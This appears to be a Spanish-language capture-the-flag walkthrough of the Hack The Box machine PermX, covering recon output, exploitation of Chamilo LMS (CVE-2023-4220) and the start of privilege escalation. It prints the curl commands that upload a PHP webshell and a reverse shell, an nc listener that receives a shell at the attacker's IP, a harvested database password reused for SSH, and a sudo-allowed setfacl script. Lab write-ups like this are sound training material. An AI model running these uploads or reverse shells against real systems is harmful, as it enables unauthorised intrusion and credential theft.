







```bash
nmap -sS -p- -Pn -n --min-rate 5000 -vvv -oN iniScanPermx.txt 10.129.61.184
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
nmap -sCV -p22,80 -Pn -n -vvv -oN verScanPermx.txt 10.129.61.184
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Añadimos permx.htb en /etc/hosts

```bash
whatweb permx.htb
http://permx.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.61.184], JQuery[3.4.1], Script, Title[eLEARNING]
```

http://permx.htb/
![](img/web_permx.png)


```bash
dirsearch -u http://permx.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/fmol/htb/permx/nmap/reports/http_permx.htb/__26-01-27_14-32-28.txt

Target: http://permx.htb/

[14:32:28] Starting: 
[14:32:30] 403 -  274B  - /.ht_wsr.txt                                      
[14:32:31] 403 -  274B  - /.htaccess.bak1                                   
[14:32:31] 403 -  274B  - /.htaccess.orig                                   
[14:32:31] 403 -  274B  - /.htaccess.sample
[14:32:31] 403 -  274B  - /.htaccess.save
[14:32:31] 403 -  274B  - /.htaccess_extra                                  
[14:32:31] 403 -  274B  - /.htaccess_orig
[14:32:31] 403 -  274B  - /.htaccess_sc
[14:32:31] 403 -  274B  - /.htaccessBAK
[14:32:31] 403 -  274B  - /.htaccessOLD
[14:32:31] 403 -  274B  - /.htaccessOLD2
[14:32:31] 403 -  274B  - /.html                                            
[14:32:31] 403 -  274B  - /.htm                                             
[14:32:31] 403 -  274B  - /.htpasswds                                       
[14:32:31] 403 -  274B  - /.htpasswd_test
[14:32:31] 403 -  274B  - /.httr-oauth
[14:32:31] 301 -  303B  - /js  ->  http://permx.htb/js/                     
[14:32:31] 403 -  274B  - /.php                                             
[14:32:33] 200 -    3KB - /404.html                                         
[14:32:34] 200 -    4KB - /about.html                                       
[14:32:45] 200 -    3KB - /contact.html                                     
[14:32:46] 301 -  304B  - /css  ->  http://permx.htb/css/                   
[14:32:51] 301 -  304B  - /img  ->  http://permx.htb/img/                   
[14:32:53] 200 -  448B  - /js/                                              
[14:32:53] 200 -  491B  - /lib/                                             
[14:32:53] 301 -  304B  - /lib  ->  http://permx.htb/lib/                   
[14:32:55] 200 -  649B  - /LICENSE.txt                                      
[14:33:07] 403 -  274B  - /server-status                                    
[14:33:07] 403 -  274B  - /server-status/                                   
                                                                             
Task Completed
```



```bash
ffuf -c -fc 302,404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://permx.htb/ -H "Host: FUZZ.permx.htb"                                                                      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302,404
________________________________________________

WWW                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 43ms]
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 7472ms]
Www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 44ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 2176ms]
WwW                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 42ms]
:: Progress: [220560/220560] :: Job [1/1] :: 249 req/sec :: Duration: [0:01:09] :: Errors: 0 ::

```

Añadimos www.permx.htb y lms.permx.htb a /etc/hosts

```bash
whatweb http://lms.permx.htb/

http://lms.permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.129.61.184], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
```

http://lms.permx.htb/

![](img/web_chamilo.png)


```bash
dirsearch -u http://lms.permx.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/fmol/htb/permx/nmap/reports/http_lms.permx.htb/__26-01-27_14-54-33.txt

Target: http://lms.permx.htb/

[14:54:33] Starting: 
[14:54:34] 200 -   46B  - /.bowerrc                                         
[14:54:34] 200 -    2KB - /.codeclimate.yml                                 
[14:54:35] 403 -  278B  - /.ht_wsr.txt                                      
[14:54:35] 403 -  278B  - /.htaccess.bak1                                   
[14:54:35] 403 -  278B  - /.htaccess.save                                   
[14:54:35] 403 -  278B  - /.htaccess.orig
[14:54:35] 403 -  278B  - /.htaccess.sample
[14:54:35] 403 -  278B  - /.htaccess_orig                                   
[14:54:35] 403 -  278B  - /.htaccess_extra
[14:54:35] 403 -  278B  - /.htaccess_sc
[14:54:35] 403 -  278B  - /.htaccessBAK
[14:54:35] 403 -  278B  - /.htaccessOLD
[14:54:35] 403 -  278B  - /.htaccessOLD2
[14:54:35] 403 -  278B  - /.html                                            
[14:54:35] 403 -  278B  - /.htm                                             
[14:54:35] 403 -  278B  - /.htpasswd_test                                   
[14:54:35] 403 -  278B  - /.htpasswds
[14:54:35] 403 -  278B  - /.httr-oauth                                      
[14:54:38] 403 -  278B  - /.php                                             
[14:54:38] 200 -    3KB - /.scrutinizer.yml                                 
[14:54:39] 200 -    4KB - /.travis.yml                                      
[14:54:50] 200 -  708B  - /app/                                             
[14:54:50] 200 -  540B  - /app/cache/                                       
[14:54:50] 301 -  312B  - /app  ->  http://lms.permx.htb/app/               
[14:54:51] 200 -  407B  - /app/logs/                                        
[14:54:51] 200 -  101KB - /app/bootstrap.php.cache                          
[14:54:52] 301 -  312B  - /bin  ->  http://lms.permx.htb/bin/               
[14:54:52] 200 -  455B  - /bin/                                             
[14:54:53] 200 -    1KB - /bower.json                                       
[14:54:55] 200 -    7KB - /composer.json                                    
[14:54:55] 200 -    5KB - /CONTRIBUTING.md                                  
[14:54:56] 200 -  587KB - /composer.lock                                    
[14:54:57] 301 -  322B  - /documentation  ->  http://lms.permx.htb/documentation/
[14:54:57] 200 -    1KB - /documentation/                                   
[14:54:58] 200 -    2KB - /favicon.ico                                      
[14:55:01] 200 -    4KB - /index.php                                        
[14:55:01] 200 -    4KB - /index.php/login/                                 
[14:55:05] 200 -  842B  - /license.txt                                      
[14:55:05] 200 -   34KB - /LICENSE                                          
[14:55:06] 301 -  313B  - /main  ->  http://lms.permx.htb/main/             
[14:55:06] 200 -   97B  - /main/
[14:55:14] 200 -    8KB - /README.md                                        
[14:55:14] 200 -  403B  - /robots.txt                                       
[14:55:15] 403 -  278B  - /server-status/                                   
[14:55:15] 403 -  278B  - /server-status                                    
[14:55:18] 200 -  444B  - /src/                                             
[14:55:18] 301 -  312B  - /src  ->  http://lms.permx.htb/src/               
[14:55:22] 302 -    0B  - /user.php  ->  whoisonline.php                    
[14:55:22] 200 -    0B  - /vendor/autoload.php                              
[14:55:22] 200 -    0B  - /vendor/composer/autoload_real.php                
[14:55:22] 200 -    0B  - /vendor/composer/autoload_files.php
[14:55:22] 200 -    0B  - /vendor/composer/autoload_namespaces.php          
[14:55:22] 200 -    0B  - /vendor/composer/ClassLoader.php
[14:55:22] 200 -    0B  - /vendor/composer/autoload_psr4.php
[14:55:22] 200 -    1KB - /vendor/composer/LICENSE
[14:55:22] 200 -    0B  - /vendor/composer/autoload_static.php              
[14:55:22] 200 -    1KB - /vendor/                                          
[14:55:23] 200 -    0B  - /vendor/composer/autoload_classmap.php            
[14:55:23] 200 -  531KB - /vendor/composer/installed.json                   
[14:55:26] 200 -    6KB - /web.config                                       
[14:55:26] 200 -  479B  - /web/                                             
                                                                             
Task Completed                                   
```

http://lms.permx.htb//README.md
```
# Chamilo 1.11.x
<SNIP>
```


### CVE-2023-4220

https://nvd.nist.gov/vuln/detail/CVE-2023-4220
https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-4220
### CVE-2023-4220

Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS \<= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell.

https://starlabs.sg/advisories/23/23-4220/


##### CVE-2023-3368
Interesante necesario para ejecutar el cve anterior, aunque no necesario para esta maquina
https://nvd.nist.gov/vuln/detail/CVE-2023-3368
https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-3368
https://starlabs.sg/advisories/23/23-3368/



```bash
┌──(fmol㉿kali)-[~/htb/permx/exploit]
└─$ echo '<?php system("id"); ?>' > rce.php

┌──(fmol㉿kali)-[~/htb/permx/exploit]
└─$ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'The file has successfully been uploaded.
┌──(fmol㉿kali)-[~/htb/permx/exploit]
└─$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


```bash
┌──(fmol㉿kali)-[~/htb/permx/exploit]
└─$ curl -F 'bigUploadFile=@php-reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.
┌──(fmol㉿kali)-[~/htb/permx/exploit]
└─$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php'



```




```bash
──(fmol㉿kali)-[~]
└─$ sudo nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.218] from (UNKNOWN) [10.129.61.184] 35996
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 21:37:13 up 17 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 



```

![](img/Pasted%20image%2020260129223805.png)


/var/www/chamilo/app/config/configuration.php

```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

/etc/passwd

Existe un usuario llamado mtz (uid1000), es un usuario valido en el sistema con la contraseña de la base de datos.

`mtz : 03F6lY3uXAP2bkW8`



```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

```bash
mtz@permx:~$ ls -lha /opt/acl.sh
-rwxr-xr-x 1 root root 419 Jun  5  2024 /opt/acl.sh
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```